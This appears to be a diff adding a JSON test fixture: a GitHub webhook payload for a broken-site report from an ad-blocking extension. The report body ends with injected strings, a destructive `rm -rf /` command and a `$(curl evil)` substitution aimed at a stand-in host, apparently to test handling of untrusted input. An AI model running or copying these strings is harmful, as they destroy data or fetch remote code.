@@ -1,0 +1,11 @@
+{
+  "action": "opened",
+  "issue": {
+    "number": 42,
+    "title": "The page looks broken: news.example.com",
+    "body": "### Report\n\nSite: news.example.com (path and query are never included)\nProblem: the page looks broken · tried: Light mode (still broken)\nVersion: 1.0.317.600 · Chrome 155 · level: Standard · packs: ads, trackers\nMatched rules: ubo#4411, easylist#1290, ubo#4411, _dynamic#5, Evil#1, ubo#0 (+12)\nPop-ups: smart\nSite access: all sites\n\n### What happened?\n\nThe video player is black. @someone please look. `rm -rf /` $(curl evil)\n",
+    "user": { "login": "reporter", "type": "User" }
+  },
+  "sender": { "login": "reporter", "type": "User" },
+  "repository": { "full_name": "owner/repo" }
+}
